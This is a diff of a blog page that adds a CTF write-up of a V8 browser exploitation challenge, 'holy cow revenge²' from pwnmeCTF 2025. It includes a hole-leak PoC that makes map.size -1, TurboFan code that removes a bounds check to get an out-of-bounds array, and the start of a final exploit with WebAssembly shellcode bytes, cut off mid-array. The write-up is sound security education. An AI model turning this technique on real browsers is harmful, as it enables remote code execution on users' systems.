@@ -11,7 +11,7 @@
   <title>holy cow - pwnme25 &middot; tourpran</title>
   <meta name="title" content="holy cow - pwnme25 &middot; tourpran" />
   
-  <meta name="description" content="a description" />
+  <meta name="description" content="browser exploitation challenge to " />
   <meta name="keywords" content="example, tag, " />
   
   
@@ -72,7 +72,7 @@
   <meta property="og:url" content="http://localhost:1313/writeups/1740990144225-holy-cow---pwnme25/">
   <meta property="og:site_name" content="tourpran">
   <meta property="og:title" content="holy cow - pwnme25">
-  <meta property="og:description" content="a description">
+  <meta property="og:description" content="browser exploitation challenge to">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
@@ -86,7 +86,7 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/writeups/1740990144225-holy-cow---pwnme25/featured.png">
   <meta name="twitter:title" content="holy cow - pwnme25">
-  <meta name="twitter:description" content="a description">
+  <meta name="twitter:description" content="browser exploitation challenge to">
 
   
   <script type="application/ld+json">
@@ -96,8 +96,8 @@
     "articleSection": "Writeups",
     "name": "holy cow - pwnme25",
     "headline": "holy cow - pwnme25",
-    "description": "a description",
-    "abstract": "\u003ch2 class=\u0022relative group\u0022\u003eIntroduction: \n    \u003cdiv id=\u0022introduction\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700\u0022\n            style=\u0022text-decoration-line: none !important;\u0022 href=\u0022#introduction\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h2\u003e\n\u003cp\u003eThis is the writeup for the pwnmeCTF 2025 challenge called \u003ccode\u003eholy cow revenge²\u003c\/code\u003e. Without wasting much time lets get right into it.\u003c\/p\u003e",
+    "description": "browser exploitation challenge to ",
+    "abstract": "\u003ch3 class=\u0022relative group\u0022\u003eIntroduction: \n    \u003cdiv id=\u0022introduction\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700\u0022\n            style=\u0022text-decoration-line: none !important;\u0022 href=\u0022#introduction\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h3\u003e\n\u003cp\u003eThis is the writeup for the pwnmeCTF 2025 challenge called \u003ccode\u003eholy cow revenge²\u003c\/code\u003e. This one is going to be crisp and quick.\u003c\/p\u003e",
     "inLanguage": "en",
     "url" : "http:\/\/localhost:1313\/writeups\/1740990144225-holy-cow---pwnme25\/",
     "author" : {
@@ -113,7 +113,7 @@
     "keywords": ["example","tag"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "164"
+    "wordCount": "975"
   }]
   </script>
 
@@ -623,7 +623,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-03T00:00:00&#43;00:00">2025-03-03</time><span class="px-2 text-primary-500">&middot;</span><span>164 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-03-03T00:00:00&#43;00:00">2025-03-03</time><span class="px-2 text-primary-500">&middot;</span><span>975 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/js/zen-mode.min.ccc8b2a0c4505216444ca25530c7328aa0bef94f43dabaf3e598e1b4271de9eec76c1cb35917471a4f7ccb8d84051b3acef42baa30724ac3a667fcf1fec4432a.js" integrity="sha512-zMiyoMRQUhZETKJVMMcyiqC&#43;&#43;U9D2rrz5ZjhtCcd6e7HbByzWRdHGk98y42EBRs6zvQrqjBySsOmZ/zx/sRDKg=="></script>
@@ -752,10 +752,19 @@
   <ul>
     <li>
       <ul>
-        <li><a href="#introduction">Introduction:</a>
+        <li>
           <ul>
+            <li><a href="#introduction">Introduction:</a></li>
             <li><a href="#the-lore">The lore:</a></li>
             <li><a href="#the-patch">The patch:</a></li>
+            <li><a href="#poc">POC:</a></li>
+            <li><a href="#exploitation">Exploitation:</a></li>
+            <li><a href="#removal-of-bound-check">Removal of Bound Check:</a></li>
+            <li><a href="#simplified-lowering">Simplified Lowering:</a></li>
+            <li><a href="#upuntil-tfinlining">Upuntil TFinlining:</a></li>
+            <li><a href="#bytecode-graph-builder">Bytecode Graph Builder:</a></li>
+            <li><a href="#finale">Finale:</a></li>
+            <li><a href="#final-exploit">Final Exploit:</a></li>
           </ul>
         </li>
       </ul>
@@ -775,10 +784,19 @@
   <ul>
     <li>
       <ul>
-        <li><a href="#introduction">Introduction:</a>
+        <li>
           <ul>
+            <li><a href="#introduction">Introduction:</a></li>
             <li><a href="#the-lore">The lore:</a></li>
             <li><a href="#the-patch">The patch:</a></li>
+            <li><a href="#poc">POC:</a></li>
+            <li><a href="#exploitation">Exploitation:</a></li>
+            <li><a href="#removal-of-bound-check">Removal of Bound Check:</a></li>
+            <li><a href="#simplified-lowering">Simplified Lowering:</a></li>
+            <li><a href="#upuntil-tfinlining">Upuntil TFinlining:</a></li>
+            <li><a href="#bytecode-graph-builder">Bytecode Graph Builder:</a></li>
+            <li><a href="#finale">Finale:</a></li>
+            <li><a href="#final-exploit">Final Exploit:</a></li>
           </ul>
         </li>
       </ul>
@@ -866,7 +884,7 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          <h2 class="relative group">Introduction: 
+          <h3 class="relative group">Introduction: 
     <div id="introduction" class="anchor"></div>
     
     <span
@@ -875,8 +893,8 @@
             style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a>
     </span>        
     
-</h2>
-<p>This is the writeup for the pwnmeCTF 2025 challenge called <code>holy cow revenge²</code>. Without wasting much time lets get right into it.</p>
+</h3>
+<p>This is the writeup for the pwnmeCTF 2025 challenge called <code>holy cow revenge²</code>. This one is going to be crisp and quick.</p>
 
 
 <h3 class="relative group">The lore: 
@@ -921,6 +939,324 @@
     </span>        
     
 </h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">+</span><span class="nf">BUILTIN</span><span class="p">(</span><span class="n">SetPrototypeHole</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span>  <span class="n">HandleScope</span> <span class="nf">scope</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span>  <span class="k">return</span> <span class="nf">ReadOnlyRoots</span><span class="p">(</span><span class="n">isolate</span><span class="p">).</span><span class="nf">hash_table_hole_value</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span>
+</span></span></code></pre></div><p>This is as straight forward as it can get. This leaks the value of the <code>hole</code> itself. How is this dangerous ? Read <a href="https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/#corrupting-map-size" target="_blank">this to get a better understanding</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">+</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span>  <span class="c1">// BUG: I saw some guis doing weird stuff with this ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>  <span class="nf">CSA_CHECK</span><span class="p">(</span><span class="n">this</span><span class="p">,</span> <span class="nf">SmiGreaterThanOrEqual</span><span class="p">(</span><span class="nf">CAST</span><span class="p">(</span><span class="nf">LoadObjectField</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">OrderedHashMap</span><span class="o">::</span><span class="nf">NumberOfElementsOffset</span><span class="p">())),</span> <span class="nf">SmiConstant</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span>
+</span></span></code></pre></div><p>This part of the patch checks if your <code>number of elements</code> for the map is greater than <code>0</code>, during a element insertion (<code>MapPrototypeSet</code>). This is what prevents you from using the previous <code>holy cow</code> challenge. Since the old exploit keeps abusing the map. (poor map).</p>
+
+
+<h3 class="relative group">POC: 
+    <div id="poc" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#poc" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">hole</span> <span class="o">=</span> <span class="nx">Set</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">hole</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">set</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Set</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">hole</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span></code></pre></div><p>If you read the other blog you would have a good idea that the <code>map.size</code> now will be equal to <code>-1</code>.</p>
+
+
+<h3 class="relative group">Exploitation: 
+    <div id="exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>I was stuck at this stage for the rest of the CTF, then moved on to solve <code>compresse</code> which was a pretty good mix of both heap &amp; stack. But yes, the idea here is that <code>map.size</code> will always be greater than equal to <code>0</code>. Well this is true for most of the cases expect here. where our map.size is <code>-1</code>.</p>
+<p>We can use turbofan to optimize our code. This is mainly done to remove bounds checking on Arrays, which would lead to creation of <code>OOB</code> array. Lets see how to do this.</p>
+
+
+<h3 class="relative group">Removal of Bound Check: 
+    <div id="removal-of-bound-check" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#removal-of-bound-check" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x1000000000050001</span><span class="nx">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">obj_list</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">bob</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mf">0.1</span><span class="p">,</span> <span class="mf">0.2</span><span class="p">,</span> <span class="mf">0.3</span><span class="p">,</span> <span class="mf">0.4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="o">-</span><span class="nx">map</span><span class="p">.</span><span class="nx">size</span> <span class="o">*</span> <span class="mh">0x8</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">[</span><span class="o">-</span><span class="nx">map</span><span class="p">.</span><span class="nx">size</span> <span class="o">*</span> <span class="mh">0x8</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">ret</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">OOB</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">OOB</span> <span class="o">=</span> <span class="nx">bob</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">OOB</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>What is happening here ? We are calling the function in a while loop to trigger turbfan optimization for the specific function. In the fuction <code>bob</code>. We are creating 2 arrays, one for creating a OOB Array and another to help overwrite the length field of the OOB Array. But what exactly is happening and how does this work?</p>
+
+
+<h3 class="relative group">Simplified Lowering: 
+    <div id="simplified-lowering" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#simplified-lowering" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/1740990144225-holy-cow---pwnme25/image-1_hu_dd29b487302095bc.png 330w,
+        /writeups/1740990144225-holy-cow---pwnme25/image-1_hu_e31a9fb3fd318538.png 660w,
+        /writeups/1740990144225-holy-cow---pwnme25/image-1_hu_49269011ad1eff6c.png 1024w,
+        /writeups/1740990144225-holy-cow---pwnme25/image-1_hu_eb3a02d0322f062a.png 2x"
+        src="/writeups/1740990144225-holy-cow---pwnme25/image-1_hu_e31a9fb3fd318538.png"
+        alt="alt text"
+      />
+      
+    </figure>
+</p>
+<p>You can clearly see that the compiler has wrong ranges assigned for the <code>map.size</code> which is <code>&gt;= 0</code>. But in reality we have our <code>map.size</code> as <code>-1</code>. This could cause problems because in the further optimizations we can see that the bound check has completely vanished.</p>
+
+
+<h3 class="relative group">Upuntil TFinlining: 
+    <div id="upuntil-tfinlining" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#upuntil-tfinlining" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/1740990144225-holy-cow---pwnme25/image-2_hu_55e61535c022f5e6.png 330w,
+        /writeups/1740990144225-holy-cow---pwnme25/image-2_hu_d5df2261b274126.png 660w,
+        /writeups/1740990144225-holy-cow---pwnme25/image-2_hu_10211083fdce2fe0.png 1024w,
+        /writeups/1740990144225-holy-cow---pwnme25/image-2_hu_45ce9821d5a1845a.png 2x"
+        src="/writeups/1740990144225-holy-cow---pwnme25/image-2_hu_d5df2261b274126.png"
+        alt="alt text"
+      />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">Bytecode Graph Builder: 
+    <div id="bytecode-graph-builder" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#bytecode-graph-builder" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/1740990144225-holy-cow---pwnme25/image-3_hu_1a0fb124db661343.png 330w,
+        /writeups/1740990144225-holy-cow---pwnme25/image-3_hu_4e68afa66bff26a5.png 660w,
+        /writeups/1740990144225-holy-cow---pwnme25/image-3_hu_d3097dab18c5d4d3.png 1024w,
+        /writeups/1740990144225-holy-cow---pwnme25/image-3_hu_5f1c5a0c759e4ade.png 2x"
+        src="/writeups/1740990144225-holy-cow---pwnme25/image-3_hu_4e68afa66bff26a5.png"
+        alt="alt text"
+      />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">Finale: 
+    <div id="finale" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#finale" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>so we go on to exploit the OOB array that was created using the incorrent <code>range analysis</code>. To make things easier the author has disabled heap sandboxing, otherwise you would need a 0day/ nday to solve the challenge. If you have doubts regarding how we use <code>wasm</code> to create and <a href="https://tourpran.github.io/posts/1728447510508-v8---arrayshift-race-condition./#how-to-smuggle-shellcode" target="_blank">smuggle shellcode read my other blogpost</a>.</p>
+
+
+<h3 class="relative group">Final Exploit: 
+    <div id="final-exploit" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#final-exploit" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">///////////////////////////////////////////////////////////////////////
+</span></span></span><span class="line"><span class="cl"><span class="c1">///////////////////         Utility Functions       ///////////////////
+</span></span></span><span class="line"><span class="cl"><span class="c1">///////////////////////////////////////////////////////////////////////
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">hex</span> <span class="o">=</span> <span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="nx">val</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 8 byte array buffer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">__buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">__f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">__buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">__u32_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">__buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// typeof(val) = float
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">__f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">__u32_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">__u32_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="c1">// Watch for little endianness
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">print</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] &#34;</span> <span class="o">+</span> <span class="nx">x</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// typeof(val) = BigInt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">__u32_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">__u32_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">__f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">sleep</span><span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">reverse</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">view1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigInt64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">view2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">view1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">view2</span><span class="p">.</span><span class="nx">reverse</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">view1</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">assert</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">assert</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">gc</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">////////////////////////////////////////////////////////////////////////
+</span></span></span><span class="line"><span class="cl"><span class="c1">/////////////////////         Main Exploit         /////////////////////
+</span></span></span><span class="line"><span class="cl"><span class="c1">////////////////////////////////////////////////////////////////////////
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// for future - shellcode smuggling
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x6d</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x6d</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xba</span><span 